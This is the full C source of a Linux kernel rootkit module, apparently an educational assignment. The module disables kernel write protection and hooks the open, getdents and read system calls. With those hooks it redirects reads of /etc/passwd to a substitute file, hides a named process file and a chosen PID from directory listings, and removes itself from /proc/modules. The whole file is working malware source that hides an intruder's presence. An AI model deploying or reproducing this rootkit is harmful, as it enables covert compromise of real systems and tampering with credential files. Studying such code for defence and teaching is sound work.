#include <linux/moduleparam.h>
#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/fs_struct.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>

#define TARGET_FILE "/etc/passwd"
#define SNEAKY_FILE "/tmp/passwd"
#define SNEAKY_MODULE "/proc/modules"
#define SNEAKY_PROCESS "sneaky_process"
#define SNEAKY_MOD "sneaky_mod"

/*Reference :http://www.tldp.org/LDP/lkmpg/2.6/html/x323.html*/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("De Lan");
// static int myPID = 0;
static char * PID = "";
// module_param(myPID, int, 0);
module_param(PID, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(PID, "Sneaky Process PID");
static int module_opened = 0;

struct linux_dirent {
  u64            d_ino;
  s64            d_off;
  unsigned short d_reclen;
  char           d_name[256];
  /*
  char           pad;       // Zero padding byte
  char           d_type;    // File type (only since Linux
                            // 2.6.4); offset is (d_reclen - 1)
  */
};


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags, mode_t mode);
asmlinkage int (*original_sys_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_sys_read)(int fd, void *buf, size_t count);


//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_open(const char *pathname, int flags, mode_t mode){
  struct path pwd;
  char cwd_buff[256];
  char * cwd;
  get_fs_pwd(current->fs, &pwd);
  cwd = dentry_path_raw(pwd.dentry, cwd_buff, 256);
  // cwd = d_path(&pwd, cwd_buff, 256);
  // char cwd_buff[256];
  // struct file * curr_file = fcheck_files(current->files, fd);
  // struct path curr_path = curr_file->f_path;
  // char * cwd = d_path(&curr_path, cwd_buff, 256);

  printk(KERN_INFO "Very, very Sneaky!\n");
  printk(KERN_INFO "%s", pathname);
  if(strcmp(pathname, "passwd") == 0){
    printk(KERN_INFO "===============%s================", cwd);
  }
  if(strcmp(TARGET_FILE, pathname) == 0){
  // if(strcmp(TARGET_FILE, pathname) == 0 || ((strcmp("/etc", cwd) == 0) && strcmp("passwd", pathname) == 0)){
  	copy_to_user((char *)pathname, SNEAKY_FILE ,sizeof(SNEAKY_FILE));
  }
  else if(strcmp(SNEAKY_MODULE, pathname) == 0){
  	printk(KERN_INFO "Sneaky mod Open!\n");
  	module_opened = 1;
  }
  return original_call(pathname, flags, mode);
}

/*Reference: http://www.man7.org/linux/man-pages/man2/getdents.2.html*/
asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
	struct linux_dirent *d;
  int bpos = 0;
  int reclen = 0;
  char d_type;
  int original_nread = original_sys_getdents(fd, dirp, count);
	if(original_nread <= 0){
		return original_nread;
	}
	while(bpos < original_nread){
		d = (struct linux_dirent *) ((char*)dirp + bpos);
    reclen = (int)d->d_reclen;
		d_type = *((char*)dirp + bpos + reclen - 1);
		if(strcmp(d->d_name, SNEAKY_PROCESS) == 0 && d_type == DT_REG){
      printk(KERN_INFO "Process found, %s, hide it.\n", d->d_name);
      memmove(d, (char*)d + reclen, original_nread - (int)((char*)d - (char*)dirp + reclen));
      original_nread -= reclen;
      break;
		}
		else if(strcmp(d->d_name, PID) == 0 && d_type == DT_DIR){
      printk(KERN_INFO "PID found, %s, hide it.\n", d->d_name);
      memmove(d, (char*)d + reclen, original_nread - (int)((char*)d - (char*)dirp + reclen));
      original_nread -= reclen;
      break;
		}
		bpos += reclen;
	}
	return original_nread;
}

/*Reference: https://blog.csdn.net/cenziboy/article/details/8761621*/
asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count){
  char *module_start = NULL;
  char *module_end = NULL;
  char cwd_buff[200];
  // struct path pwd;
  // char cwd_buff[256];
  // char * cwd;
  // get_fs_pwd(current->fs, &pwd);
  // cwd = dentry_path_raw(pwd.dentry, cwd_buff, 256);
  
  //get the current path
  struct file * curr_file = fcheck_files(current->files, fd);
  struct path curr_path = curr_file->f_path;
  char * cwd = d_path(&curr_path, cwd_buff, 200);

  ssize_t original_bytes = original_sys_read(fd, buf, count);
  if(original_bytes <= 0){
    return original_bytes;
  }
  // if(module_opened == 1 && strstr(buf, SNEAKY_MOD)){
  if(module_opened == 1 && strcmp(cwd, SNEAKY_MODULE) == 0 && strstr(buf, SNEAKY_MOD)){
    module_opened = 0;
    module_start = strstr(buf, SNEAKY_MOD);
    module_end = module_start;
    while(*module_end != '\n'){
      module_end++;
    }
    memmove(module_start, module_end + 1, original_bytes - (int)((module_end + 1 - (char *)buf)));
    original_bytes -= (int)(module_end - module_start);
  }
	return original_bytes;
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void){
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_open;

  original_sys_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;

  original_sys_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;

  printk(KERN_INFO "Sneaky module successfully loaded.\n");

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  

static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_read) = (unsigned long)original_sys_read;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_sys_getdents;
  printk(KERN_INFO "Sneaky module successfully unloaded\n");
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

